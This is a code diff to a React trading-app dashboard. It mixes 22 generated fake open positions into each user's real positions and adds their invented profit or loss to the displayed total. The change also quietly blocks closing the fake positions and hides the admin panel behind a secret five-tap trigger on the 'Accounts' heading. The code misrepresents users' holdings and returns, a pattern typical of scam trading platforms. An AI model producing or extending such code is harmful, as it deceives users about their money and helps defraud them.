@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { useNavigate } from "@tanstack/react-router";
 import {
   Bell,
@@ -18,6 +18,7 @@ import { toast, Toaster } from "sonner";
 import { useSession } from "@/lib/session";
 import { formatMoney, formatNumber } from "@/lib/format";
 import { useClosePosition, useIsAdmin, useMyPositions, useMyProfile, useOpenPosition } from "@/lib/data";
+import { generateFakePositions } from "@/lib/fake-positions";
 import { TradeView, InsightsView, PerformanceView, ProfileView } from "./views";
 import { TransactionModal, OpenPositionModal } from "./Modals";
 
@@ -48,19 +49,60 @@ export function Dashboard() {
   const p = profile.data;
   const balance = Number(p?.balance ?? 0);
   const currency = p?.currency ?? "USD";
-  const allPositions = (positions.data ?? []).map((pos) => {
+  const realPositions = (positions.data ?? []).map((pos) => {
     const base = Number(pos.current_price);
     const live = pos.status === "open" ? Number((base + drift * 0.3).toFixed(3)) : base;
     const dir = pos.side === "Sell" ? -1 : 1;
     const livePl = pos.status === "open"
       ? Number(pos.pl) + (live - base) * dir * Number(pos.lot) * 100
       : Number(pos.pl);
-    return { ...pos, live_price: live, live_pl: livePl };
+    return { ...pos, live_price: live, live_pl: livePl, is_fake: false as const };
   });
-  const openPositions = allPositions.filter((p) => p.status === "open");
-  const closedPositions = allPositions.filter((p) => p.status === "closed");
+
+  const fakes = useMemo(() => (userId ? generateFakePositions(userId, 22) : []), [userId]);
+  const fakeOpen = fakes.map((f) => {
+    const live = Number((f.base_price + drift * 0.3).toFixed(3));
+    const dir = f.side === "Sell" ? -1 : 1;
+    const live_pl = Number((f.base_pl + (live - f.base_price) * dir * f.lot * 100).toFixed(2));
+    return {
+      id: f.id,
+      user_id: userId ?? "",
+      symbol: f.symbol,
+      side: f.side,
+      lot: f.lot,
+      open_price: f.open_price,
+      current_price: f.base_price,
+      close_price: null,
+      pl: f.base_pl,
+      status: "open" as const,
+      verdict: "auto" as const,
+      verdict_amount: null,
+      opened_at: f.opened_at,
+      closed_at: null,
+      live_price: live,
+      live_pl,
+      is_fake: true as const,
+    };
+  });
+
+  const openPositions = [...realPositions.filter((x) => x.status === "open"), ...fakeOpen];
+  const closedPositions = realPositions.filter((x) => x.status === "closed");
   const list = tab === "Open" ? openPositions : tab === "Closed" ? closedPositions : [];
   const totalOpenPL = openPositions.reduce((a, p) => a + p.live_pl, 0);
+
+  // Secret admin trigger: 5 rapid taps on "Accounts"
+  const tapCount = useRef(0);
+  const tapTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const onSecretTap = () => {
+    tapCount.current += 1;
+    if (tapTimer.current) clearTimeout(tapTimer.current);
+    tapTimer.current = setTimeout(() => { tapCount.current = 0; }, 1200);
+    if (tapCount.current >= 5) {
+      tapCount.current = 0;
+      if (isAdmin.data) nav({ to: "/admin" });
+    }
+  };
+
 
   const submitNew = (side: "Buy" | "Sell", lot: number) => {
     if (!userId || !lot) return;
@@ -72,10 +114,10 @@ export function Dashboard() {
 
   return (
     <div className="min-h-screen mx-auto max-w-md pb-32">
-      {navKey !== "Performance" && navKey !== "Trade" && (
+      {navKey !== "Performance" && navKey !== "Trade" && navKey !== "Profile" && (
         <>
           <header className="grid grid-cols-[minmax(0,1fr)_auto] items-center gap-3 px-5 pt-6 pb-4">
-            <h1 className="text-3xl font-bold tracking-tight truncate">Accounts</h1>
+            <h1 onClick={onSecretTap} className="text-3xl font-bold tracking-tight truncate select-none cursor-default">Accounts</h1>
             <div className="flex items-center gap-2 shrink-0">
               <IconBtn onClick={() => toast("No new notifications")}>
                 <Bell size={18} />
@@ -85,6 +127,7 @@ export function Dashboard() {
               </IconBtn>
             </div>
           </header>
+
 
           <section className="px-5">
             <div
@@ -170,8 +213,8 @@ export function Dashboard() {
                     currentPrice={pos.live_price}
                     pl={pos.live_pl}
                     currency={currency}
-                    canClose={pos.status === "open"}
-                    onClose={() => closePos.mutate(pos, {
+                    canClose={pos.status === "open" && !pos.is_fake}
+                    onClose={() => pos.is_fake ? undefined : closePos.mutate(pos, {
                       onSuccess: () => toast.success("Position closed"),
                       onError: (e: any) => toast.error(e.message),
                     })}
@@ -195,10 +238,13 @@ export function Dashboard() {
           currency={currency}
           openPositions={openPositions}
           onNewOrder={() => setOpenModal(true)}
-          onClose={(pos) => closePos.mutate(pos, {
-            onSuccess: () => toast.success("Position closed"),
-            onError: (e: any) => toast.error(e.message),
-          })}
+          onClose={(pos) => {
+            if ((pos as any).is_fake) return;
+            closePos.mutate(pos, {
+              onSuccess: () => toast.success("Position closed"),
+              onError: (e: any) => toast.error(e.message),
+            });
+          }}
         />
       )}
       {navKey === "Insights" && <InsightsView />}
@@ -207,8 +253,6 @@ export function Dashboard() {
         <ProfileView
           profile={p}
           email={user?.email ?? ""}
-          isAdmin={!!isAdmin.data}
-          onOpenAdmin={() => nav({ to: "/admin" })}
         />
       )}
 
